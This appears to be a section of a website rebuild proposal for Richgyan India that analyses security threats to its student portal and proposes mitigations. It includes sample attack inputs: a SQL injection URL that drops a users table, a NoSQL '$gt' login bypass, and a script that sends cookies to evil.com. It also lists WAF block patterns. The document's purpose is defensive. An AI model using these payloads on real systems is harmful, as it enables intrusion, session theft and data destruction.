Security threat analysis — deep dive
Why this section matters more than design. Richgyan India manages data for 50,000+ students, 11,000+ trainers, and franchise centers across the country. A single security breach can expose every student's PII, allow certificate forgery at scale, destroy employer trust built over 8 years, and invite regulatory action under India's DPDP Act 2023. Every threat below has been identified from the live richgyan.com stack — and every solution is part of the rebuild proposal.
Certificate Forgery & Verification Bypass
Anyone can fake a Richgyan certificate — there's no database to check against
Critical
🔍 How this attack works
Your current certificate verification page at /certificate-verification/ is a static HTML page — it has no backend database query. An attacker can open any image editor, duplicate a real certificate template, change the name, dates, and course name, and print a fully convincing fake. There is zero technical barrier. Additionally, since there's no cryptographic signature or tamper-evident hash, even a real certificate can be altered after issuance. This is called a document forgery attack — it requires no hacking skill whatsoever.
💥 Impact on Richgyan India
  • Fake certificate holders get jobs using Richgyan's name — destroying your brand with employers
  • Legitimate students lose credibility when employers can't verify their certificates
  • Franchise centers can issue unauthorized certificates with no oversight
  • Legal liability if forged certificates are used for government job applications
✅ Our Solution
  • Each certificate gets a unique UUID stored in a PostgreSQL database at issuance time
  • A SHA-256 cryptographic hash of all certificate fields is stored — any field change invalidates it
  • QR code printed on every certificate links to richgyan.com/verify/[UUID] — instant verification
  • Employer-facing public API: GET /api/v1/verify?cert_id=xxx returns verified JSON
  • PDF certificates generated with digital signature using ReportLab + Python cryptography library
  • Admin panel shows full issuance history with franchise center ID — full audit trail
PostgreSQL UUID SHA-256 Hash QR Code Generation ReportLab PDF Sign Public Verify API
Broken Authentication & Session Hijacking
No OTP, no 2FA — student & admin accounts fall to a single phishing email
Critical
🔍 How this attack works
The current system uses WordPress native login — username + password only. Attackers exploit this in three ways: (1) Credential stuffing — using leaked password databases (millions of Indian email/password combos are freely available on Telegram) to try bulk logins. (2) Phishing — sending a fake "Richgyan login" page to students or franchise owners to steal credentials. (3) Session fixation — WordPress session cookies don't rotate on login, allowing an attacker who intercepts one cookie (on a public WiFi) to maintain access forever. Your exposed /my-account/ and /richgyan (center login) endpoints have no rate limiting, meaning an attacker can try thousands of passwords per minute.
💥 Impact on Richgyan India
  • Admin account takeover exposes all 50,000+ student records instantly
  • Franchise center accounts compromised — fake enrollment, fee fraud
  • Student portal breach exposes marks, fee details, personal addresses
  • No audit log means you wouldn't even know a breach happened
✅ Our Solution
  • OTP-first login via Twilio SMS — phone number + OTP, no password required for students
  • JWT with refresh token rotation — every session refresh invalidates the old token (httpOnly, Secure, SameSite=Strict cookies)
  • Role-based access control (RBAC) — Student / Teacher / Franchise Owner / Admin — strict server-side enforcement
  • Redis rate limiter — max 5 failed OTP attempts per phone per 15 minutes, then 1-hour lockout
  • Login audit log — every login recorded with IP, device fingerprint, timestamp in database
  • Optional TOTP 2FA (Google Authenticator) for Admin and Franchise owners
Twilio OTP JWT Rotation Redis Rate Limit RBAC TOTP (pyotp) Audit Logging
SQL / NoSQL Injection
Unsanitized inputs in WooCommerce or any form can dump your entire student database
High
🔍 How this attack works
Any form field that passes user input directly into a database query is injectable. For WordPress/WooCommerce, search inputs, contact forms, and the student registration product are common targets. Example of a classic SQL injection payload in a search field:

GET /wp-json/wc/v3/products?search=' OR 1=1; DROP TABLE wp_users; --
If the query is not parameterized, this executes inside your database. For MongoDB (planned), the equivalent is a NoSQL injection using JSON operator abuse: submitting {"$gt": ""} as a password field can bypass authentication entirely if the query is built from raw user input. WordPress has historical SQL injection CVEs in WooCommerce, especially in older unpatched versions.
💥 Impact on Richgyan India
  • Complete student database dump — names, phone numbers, addresses, payment history
  • Admin credentials extracted and cracked offline
  • Database tables deleted — complete data destruction with no backup
  • DPDP Act 2023 violation — mandatory breach notification + financial penalties
✅ Our Solution
  • Parameterized queries everywhere — SQLAlchemy ORM with PostgreSQL; Mongoose schema validation with MongoDB — raw string interpolation into queries is banned in the codebase
  • Input validation layer — Pydantic (Python) or Joi (Node.js) validates and sanitizes every API request before it touches the database
  • Mongoose strict schema — unknown fields silently stripped; $-prefixed keys rejected at middleware level
  • Database user with minimum privileges — the app DB user cannot DROP tables or access system tables
  • WAF rule: block payloads containing $gt, $ne, $where, OR 1=1, UNION SELECT, DROP TABLE
SQLAlchemy ORM Pydantic Validation Mongoose Schema Cloudflare WAF Least Privilege DB
Cross-Site Scripting (XSS)
Injecting malicious scripts via contact forms, notice boards, or admin comment fields
High
🔍 How this attack works
XSS attacks inject JavaScript into pages that other users then load. There are two types relevant here: Stored XSS — an attacker submits a contact form message like <script>document.location='https://evil.com/steal?c='+document.cookie</script>. If the admin views it in the WordPress dashboard, the script executes in the admin's browser, stealing their session cookie. With that cookie, the attacker logs in as admin. Reflected XSS — the URL parameter is printed unsanitized in the page, e.g. richgyan.com/search?q=<script>...</script>. WordPress has had over 40 confirmed XSS CVEs in Elementor alone since 2020. Your current site has no Content Security Policy header, meaning any injected script runs without restriction.
💥 Impact on Richgyan India
  • Admin session cookie stolen → full site takeover without knowing the password
  • Student portal defaced — fake certificate results, phishing overlays injected
  • Malicious scripts silently loaded by all 50,000+ students visiting the site
  • SEO spam injection — hidden links to pharma sites destroy Google ranking
✅ Our Solution
  • Content Security Policy (CSP) header — strict policy blocks inline scripts and limits script sources to our own domain only
  • DOMPurify on all React/frontend rendering — any user-supplied content sanitized before DOM insertion
  • Server-side HTML encoding — Jinja2/React escapes < > & " ' automatically; no raw HTML rendering of user input
  • httpOnly + Secure session cookies — even if a script runs, it cannot read the session cookie via JavaScript
  • Response headers: X-Content-Type-Options: nosniff, X-XSS-Protection: 1; mode=block, X-Frame-Options: DENY
CSP Header DOMPurify Jinja2 Auto-escape httpOnly Cookies Security Headers
Insecure Direct Object References (IDOR)
Changing a student ID in a URL to access another student's marks, fees, or personal data
High
🔍 How this attack works
IDOR occurs when a system uses predictable identifiers (like sequential integers) in URLs or API calls, and doesn't verify that the logged-in user is authorized to access that resource. Example: Student Rahul logs in and sees his fee receipt at /portal/receipt?id=1042. He manually changes it to id=1043 and sees another student's payment details. No hacking tool required — just a browser's address bar. This is one of the most common vulnerabilities found in Indian educational portals. In a franchise model like Richgyan, it's even more dangerous — a franchise center owner could access data from another franchise's students by simply incrementing IDs.
💥 Impact on Richgyan India
  • Mass exposure of student personal information to other students or competitors
  • Franchise centers able to view competitor franchise data — business intelligence theft
  • Fee payment receipts of other students accessible — financial privacy violation
  • Exam results of all students accessible before official release
✅ Our Solution
  • UUIDs instead of sequential integers for all resource IDs — /receipt/a7f3c2e1-... instead of /receipt/1042
  • Server-side ownership checks on every API endpoint — middleware verifies the JWT user ID matches the requested resource owner before returning any data
  • Franchise-scoped data isolation — franchise center X can only query students enrolled under their center ID, enforced at the database query level (not just the UI)
  • API design principle: never trust the client — every request is re-authenticated against the database, not just the session
UUID Primary Keys Ownership Middleware Scoped DB Queries Zero Client Trust
WordPress Plugin & CMS CVE Exploitation
Elementor 3.30.2, WooCommerce, and LMS plugins carry known, publicly listed vulnerabilities
High
🔍 How this attack works
Richgyan India's site runs Elementor 3.30.2 — confirmed via the meta-generator tag. This version number is publicly visible, and attackers use automated scanners (WPScan, Nuclei) to look up this exact version in the CVE database. Elementor has had 47+ confirmed security advisories since 2021, including RCE (Remote Code Execution), arbitrary file upload, and privilege escalation bugs. WooCommerce and any LMS plugin add further attack surface. Once an attacker knows what version you're running, they can download a pre-built exploit from GitHub and run it in minutes. This is called a Known Vulnerability Exploitation attack — it requires no creativity, just a Google search.
💥 Impact on Richgyan India
  • Remote Code Execution — attacker runs arbitrary commands on your server, installing backdoors
  • Arbitrary file upload — malware, web shells uploaded to your hosting
  • Database access via compromised plugin — same as SQL injection, but without needing to inject
  • Site defacement, ransomware installation on server
✅ Our Solution
  • Migrate entirely off WordPress — custom Next.js + Flask stack eliminates the entire WordPress CVE attack surface
  • Remove meta-generator tag — never advertise your tech stack versions in HTML headers
  • Cloudflare WAF in front of all traffic — blocks known WordPress/WooCommerce exploit patterns even if WordPress is temporarily kept
  • Automated dependency scanning with GitHub Dependabot — alerts on new CVEs in every package within hours of disclosure
  • No CMS plugins in the new stack — every feature is purpose-built, minimizing third-party attack surface
Migrate Off WordPress Cloudflare WAF Dependabot No Meta-Generator Minimal Dependencies
Student PII Data Breach (DPDP Act 2023 Risk)
50,000+ student records with no encryption at rest — a breach means DPDP Act penalties and brand destruction
Critical
🔍 How this attack works
Student records in the current WordPress/WooCommerce database include full names, phone numbers, addresses, email IDs, course names, fee payment history, and potentially Aadhaar-linked data. In a typical WordPress setup, this data sits in the wp_users, wp_usermeta, and WooCommerce order tables — stored in plain text or with only bcrypt on passwords. If any of the attack vectors above succeed (injection, plugin CVE, brute force), the attacker gets a full PII dump instantly. India's Digital Personal Data Protection (DPDP) Act 2023 — effective from 2025 — requires mandatory breach notification to the Data Protection Board within 72 hours, and imposes penalties up to ₹250 crore per violation for significant data fiduciaries managing large-scale student data.
💥 Impact on Richgyan India
  • DPDP Act financial penalties — up to ₹250 crore for large-scale data breach
  • Student data sold on dark web — identity fraud, SIM swap attacks on your students
  • Brand permanently destroyed — parents will not enroll children after a public breach
  • Franchise partners lose confidence and exit the network
✅ Our Solution
  • AES-256 encryption at rest for all sensitive PII fields (phone, address, Aadhaar) in PostgreSQL using pgcrypto extension
  • bcrypt (cost factor 12) for all passwords — even a full DB dump reveals nothing crackable
  • Data minimization — only collect what's needed; Aadhaar stored as last-4-digits only unless explicitly required
  • DPDP-compliant consent system — explicit consent checkboxes at enrollment, stored with timestamp and IP
  • Automated daily encrypted backups to AWS S3 with server-side encryption (SSE-S3)
  • Database activity monitoring — alerts on bulk SELECT queries (potential data exfiltration attempt)
AES-256 at Rest bcrypt (cost 12) pgcrypto DPDP Consent System S3 Encrypted Backup DB Activity Monitor
DDoS Attacks & No CDN / Rate Limiting
A competitor or malicious actor can flood your server with requests and take you offline for days
Medium
🔍 How this attack works
A Distributed Denial of Service (DDoS) attack floods a server with more traffic than it can handle, causing legitimate users to get timeouts or errors. In the Indian ed-tech space, DDoS attacks are frequently used by competitors during critical enrollment periods (beginning of academic year, exam result season). Your current setup appears to use shared/VPS hosting with no CDN — meaning all traffic hits your origin server directly. With no rate limiting and no WAF, even a moderate botnet (5,000 requests/second) would bring WordPress down. Additionally, without a CDN, your pages load slowly for users in South India or other regions far from the server — hurting both performance and SEO.
💥 Impact on Richgyan India
  • Site goes offline during exam result announcements — peak traffic moment turned into PR disaster
  • Franchise registration portal unavailable during key enrollment windows
  • Google penalizes slow/unreachable sites — SEO ranking drops
  • No rate limiting means brute force, credential stuffing, and scraping run undetected
✅ Our Solution
  • Cloudflare Free/Pro tier in front of all traffic — absorbs DDoS attacks up to terabit scale before they touch your server
  • Cloudflare CDN caches static assets at 300+ edge locations globally — fast loads from Chennai, Mumbai, Delhi, Northeast India
  • Next.js ISR + Edge caching — public pages like home, courses, gallery served from cache; zero origin server load
  • Redis rate limiting on all API endpoints — 100 req/min per IP, with exponential backoff on repeated violations
  • Nginx upstream limits + connection throttling at the reverse proxy layer
  • Uptime monitoring with instant Telegram alerts (via your existing bot) if server goes down
Cloudflare WAF + DDoS Cloudflare CDN Redis Rate Limit Nginx Throttle Next.js ISR Cache Telegram Uptime Alert
